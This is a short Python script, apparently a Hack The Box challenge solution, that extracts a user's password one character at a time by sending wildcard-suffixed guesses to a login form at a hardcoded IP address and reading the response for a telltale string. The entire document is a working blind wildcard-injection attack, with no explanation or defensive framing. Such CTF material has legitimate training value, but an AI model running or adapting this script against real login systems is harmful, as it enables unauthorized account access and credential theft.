import requests
import string

alpha = list(string.printable)
alpha.remove('*')
uname = "rEesE"
url = "http://157.245.40.78:30980/login"
passwd = "HTB"

irange = range(0,len(alpha))
i = 0
while (i < len(alpha)):
	print(i, end='\r')
	obj = {'username': f"{uname}", 'password': f"{passwd}{alpha[i]}*"}
	r = requests.post(url, data=obj)
	if (r.text.find("No search results") != -1):
		passwd += alpha[i]
		i = -1
		print(passwd)
	i += 1